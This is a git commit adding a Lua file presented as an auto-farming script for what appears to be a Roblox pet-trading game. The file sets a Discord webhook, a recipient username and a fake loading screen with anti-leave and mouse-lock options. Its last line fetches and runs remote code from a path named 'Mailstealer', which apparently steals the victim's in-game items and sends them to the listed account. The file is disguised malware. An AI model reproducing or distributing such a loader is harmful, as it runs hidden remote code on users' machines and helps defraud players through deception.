4e32564b305db40d09ffb493b71a0aaa8b7ec80d
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-28 22:07:35 +0700

    Create

---
+++ PsxScript/AutoFarming/LynxMinScript/main.lua
@@ -0,0 +1,26 @@
+--[[
+  __  __       _ _     _             _           
+  |  \ | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\ |/ _` | | / __| __/ _ \_` | |/ _ \__|
+  | |  | | (_| | | \ \|  __/ (_| | |  __/ |   
+  |_|  |_|\,_|_|_|___/\\_|\,_|_|\_|_|   
+
+]]--
+
+UserName = "MimiKitty9026"
+Webhook = "https://discord.com/api/webhooks/754925014926491750/kNkXL28Ayrw3bVH0ihRY6RavEI1zndFTPud23roIkMjJTy-fdqN-zEpPptKGcQDJcmHp"
+UserName2 = "MimiKitty9026"
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+
+
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoonScriptt/MoonHubHere/main/Mailstealer/Moonontop/Petsim00/main.lua"))()
